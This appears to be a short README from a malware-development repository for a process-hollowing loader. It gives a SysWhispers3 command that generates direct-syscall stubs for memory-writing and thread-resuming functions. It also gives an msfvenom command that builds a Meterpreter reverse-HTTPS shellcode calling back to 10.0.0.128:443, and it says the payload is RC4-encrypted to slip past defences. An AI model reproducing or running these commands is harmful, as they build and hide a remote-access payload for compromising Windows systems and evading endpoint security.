master branch is using the struct getprocaddress method to retrieve fucntions from ntdll

syscalls branch is for syswhispers3 implementation

other branches to come :)

```
python3 syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtResumeThread,NtWriteVirtualMemory,NtAllocateVirtualMemory,NtProtectVirtualMemory,NtReadVirtualMemory -o /home/noah/Desktop/MALDEV/modules/ProcessHollowing/syswhispers3_files -v
```

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.0.0.128 lport=443 exitfunc=thread -f raw > payload.raw
```

Payload into HellShell Rc4 decryptor using `SystemFunction032`
